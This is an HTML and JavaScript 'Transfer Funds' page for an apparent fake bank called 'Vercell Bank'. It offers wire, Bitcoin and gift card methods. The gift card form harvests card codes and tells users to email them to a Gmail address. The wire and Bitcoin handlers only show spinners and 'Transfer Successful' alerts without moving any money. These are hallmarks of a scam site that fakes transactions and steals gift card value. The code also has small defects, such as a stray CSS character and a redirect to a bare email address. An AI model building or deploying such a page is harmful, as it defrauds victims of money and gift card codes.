<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Transfer - Vercell Bank</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #1e3a8a, #2a5298);
      color: #f8fafc;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 20px;
    }

    .container {
      background-color: #111827;
      padding: 30px;
      border-radius: 16px;
      max-width: 540px;
      width: 100%;
      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.4);
    }

video.bg-video {
      position: fixed;
      top: 0;
      left: 0;
      min-width: 100%;
      min-height: 100%;
      z-index: -2;
      object-fit: cover;
    }

    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.6);
      z-index: -1;
    }.

    h1 {
      text-align: center;
      color: #60a5fa;
      margin-bottom: 25px;
    }

    .form-group {
      margin-bottom: 16px;
    }

    .form-group label {
      display: block;
      font-size: 0.9rem;
      margin-bottom: 6px;
      color: #cbd5e1;
    }

    .form-group input,
    .form-group select {
      width: 100%;
      padding: 12px;
      border-radius: 10px;
      border: 1px solid #334155;
      background-color: #1f2937;
      color: #f1f5f9;
      font-size: 1rem;
    }

    .form-group input:focus,
    .form-group select:focus {
      border-color: #3b82f6;
      outline: none;
    }

    .submit-btn {
      width: 100%;
      padding: 14px;
      background-color: #3b82f6;
      border: none;
      color: #fff;
      font-size: 1rem;
      font-weight: bold;
      border-radius: 10px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .submit-btn:hover {
      background-color: #2563eb;
    }

    .note {
      font-size: 0.85rem;
      color: #facc15;
      margin-bottom: 15px;
    }

    .back-link {
      margin-top: 15px;
      display: block;
      text-align: center;
      color: #60a5fa;
      text-decoration: none;
      font-size: 0.9rem;
    }

    .back-link:hover {
      text-decoration: underline;
    }

    .hidden {
      display: none;
    }
  </style>
</head>
<body>


<!-- ðŸ” Background Video -->
  <video autoplay muted loop class="bg-video">
    <source src="https://www.w3schools.com/howto/rain.mp4" type="video/mp4">
    Your browser does not support HTML5 video.
  </video>
  <div class="overlay"></div>


  <div class="container">
    <h1>Transfer Funds</h1>

    <div class="form-group">
      <label>Select Transfer Method</label>
      <select id="methodSelect" required>
        <option value="">-- Select --</option>
        <option value="wire">Wire Transfer</option>
        <option value="bitcoin">Bitcoin</option>
        <option value="giftcard">Gift Card</option>
      </select>
    </div>

    <!-- Wire Transfer Form -->
    <form id="wireForm" class="hidden">
      <div class="form-group">
        <label>Recipient Name</label>
        <input type="text" id="wireName" required />
      </div>
      <div class="form-group">
        <label>Account Number</label>
        <input type="text" id="wireAccount" required />
      </div>
      <div class="form-group">
        <label>Bank Name</label>
        <input type="text" id="wireBank" required />
      </div>
      <div class="form-group">
        <label>Amount (USD)</label>
        <input type="number" id="wireAmount" required />
      </div>
      <button type="submit" class="submit-btn">Send Wire Transfer</button>
    </form>

    <!-- Bitcoin Transfer Form -->
    <form id="bitcoinForm" class="hidden">
      <div class="form-group">
        <label>Bitcoin Wallet Address</label>
        <input type="text" id="btcWallet" required />
      </div>
      <div class="form-group">
        <label>Amount (USD)</label>
        <input type="number" id="btcAmount" required />
      </div>
      <button type="submit" class="submit-btn">Send Bitcoin</button>
    </form>

   <form id="giftForm" class="hidden" onsubmit="sendGiftCardEmail(); return false;">
  <div class="note">Please send gift card codes to: <b>vercellbank@gmail.com</b></div>
  <div class="form-group">
    <label>Gift Card Type</label>
    <input type="text" id="giftType" placeholder="e.g. Amazon, iTunes" required />
  </div>
  <div class="form-group">
    <label>Card Value (USD)</label>
    <input type="number" id="giftAmount" required />
  </div>
  <div class="form-group">
    <label>Card Code</label>
    <input type="text" id="giftCode" required />
  </div>
  <button type="submit" class="submit-btn">Submit Gift Card</button>
</form>

    <a href="dashboard.html" class="back-link">← Back to Dashboard</a>
  </div>

  <script>
    const methodSelect = document.getElementById('methodSelect');
    const wireForm = document.getElementById('wireForm');
    const bitcoinForm = document.getElementById('bitcoinForm');
    const giftForm = document.getElementById('giftForm');

    methodSelect.addEventListener('change', () => {
      wireForm.classList.add('hidden');
      bitcoinForm.classList.add('hidden');
      giftForm.classList.add('hidden');

      const method = methodSelect.value;
      if (method === 'wire') wireForm.classList.remove('hidden');
      if (method === 'bitcoin') bitcoinForm.classList.remove('hidden');
      if (method === 'giftcard') giftForm.classList.remove('hidden');
    });




  
  
  wireForm.addEventListener('submit', e => {
    e.preventDefault();

    const amount = parseFloat(document.getElementById('wireAmount').value.trim());

    // Create loading overlay
    const loaderOverlay = document.createElement('div');
    loaderOverlay.style.position = 'fixed';
    loaderOverlay.style.top = '0';
    loaderOverlay.style.left = '0';
    loaderOverlay.style.width = '100vw';
    loaderOverlay.style.height = '100vh';
    loaderOverlay.style.backgroundColor = 'rgba(0, 0, 0, 0.75)';
    loaderOverlay.style.display = 'flex';
    loaderOverlay.style.flexDirection = 'column';
    loaderOverlay.style.alignItems = 'center';
    loaderOverlay.style.justifyContent = 'center';
    loaderOverlay.style.zIndex = '9999';

    // Spinner
    const spinner = document.createElement('div');
    spinner.style.border = '8px solid #334155';
    spinner.style.borderTop = '8px solid #3b82f6';
    spinner.style.borderRadius = '50%';
    spinner.style.width = '60px';
    spinner.style.height = '60px';
    spinner.style.animation = 'spin 1s linear infinite';

    // Text
    const text = document.createElement('p');
    text.textContent = 'Processing transfer...';
    text.style.color = '#facc15';
    text.style.marginTop = '16px';
    text.style.fontSize = '1rem';

    // Add spinner + text to overlay
    loaderOverlay.appendChild(spinner);
    loaderOverlay.appendChild(text);
    document.body.appendChild(loaderOverlay);

    // Spinner animation
    const style = document.createElement('style');
    style.textContent = `
      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
    `;
    document.head.appendChild(style);

    // Wait 5 seconds then redirect
    setTimeout(() => {
      document.body.removeChild(loaderOverlay);

      if (amount >= 50000) {
        alert("✅Transfer Successful.");
        window.location.href = "dashboard.html";
      } else {
        alert("✅ Transfer Successful.");
        window.location.href = "dashboard.html";
      }
    }, 5000);
  });






    bitcoinForm.addEventListener('submit', e => {
      e.preventDefault();
      alert('Bitcoin transfer submitted!');
      window.location.href = "dashboard.html";
    });







    giftForm.addEventListener('submit', e => {
      e.preventDefault();
      alert('Gift card submitted! Please check your email.');
      window.location.href = "vercellbank@gmail.com";
    });
  </script>




</body>
</html>
